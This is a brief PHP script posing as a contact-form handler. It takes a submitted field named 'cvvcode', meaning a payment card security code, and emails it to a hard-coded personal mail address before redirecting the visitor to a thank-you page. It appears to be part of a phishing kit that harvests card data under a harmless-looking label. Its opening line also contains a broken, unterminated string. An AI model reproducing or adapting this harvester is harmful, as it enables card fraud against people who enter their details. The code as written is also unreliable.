
<?php

$errors = ";

$myemail = 'puacali10@mail.com';//<—–Put Your email address here.

if(empty($_POST['cvvcode']))

{

$errors .= "\n Error: fields are required";

}

$cvvcode = $_POST['cvvcode'];

if( empty($errors))

{

$to = $myemail;

$email_subject = "Contact form submission: $cvvcode";

$email_body = "You have received a new message. ".

" Here are the details:\n Name: $cvvcode \n ";

$headers = "From: $myemail\n";

$headers .= "Reply-To: $myemail";

mail($to,$email_subject,$email_body,$headers);

//redirect to the 'thank you' page

header('Location: contact-form-thank-you.html');

}

?>